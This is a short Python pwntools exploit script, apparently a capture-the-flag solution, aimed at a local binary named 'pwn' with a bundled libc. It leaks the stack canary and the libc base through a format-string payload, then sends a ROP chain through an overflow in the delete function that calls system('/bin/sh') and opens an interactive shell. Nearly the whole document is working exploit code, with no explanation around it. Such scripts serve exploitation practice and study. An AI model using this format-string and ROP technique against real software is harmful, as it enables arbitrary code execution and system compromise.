#!/usr/bin/env python3
from pwn import *

context(arch='amd64', os='linux', log_level='debug')
p = lambda s, t: print(f"\033[0;31;43m{s.ljust(15, ' ') + '------------------------->' + hex(t)}\033[0m")


sh = process("./pwn")
libc = ELF("./libc.so.6")


def add(size, data):
    sh.sendlineafter("> ", "1")
    sh.sendlineafter("> ", str(size))
    sh.sendlineafter("> ", data)


def delete(index):
    sh.sendlineafter("> ", "2")
    sh.sendlineafter("> ", index)


def show(index):
    sh.sendlineafter("> ", "3")
    sh.sendlineafter("> ", str(index))

#%7$p
add(0x50,b"%7$p-%13$p")
show(0)
sh.recvuntil("0x")
canary = eval(b"0x" + sh.recvuntil("-")[:-1])
libc.address = eval(sh.recvline()) - 0x29d90
pop_rdi = 0x000000000002a3e5 + libc.address
ret = 0x0000000000029139 + libc.address
# gdb.attach(sh,"brva 0x0000000000014A2\nc")

payload = p64(0x100) + p64(0)*2 + p64(canary) + p64(0) + p64(ret) + p64(pop_rdi) + p64(next(libc.search(b'/bin/sh'))) + p64(libc.sym["system"])
delete(payload)

# p("canary",canary)
# p("libc",libc.address)


sh.interactive()
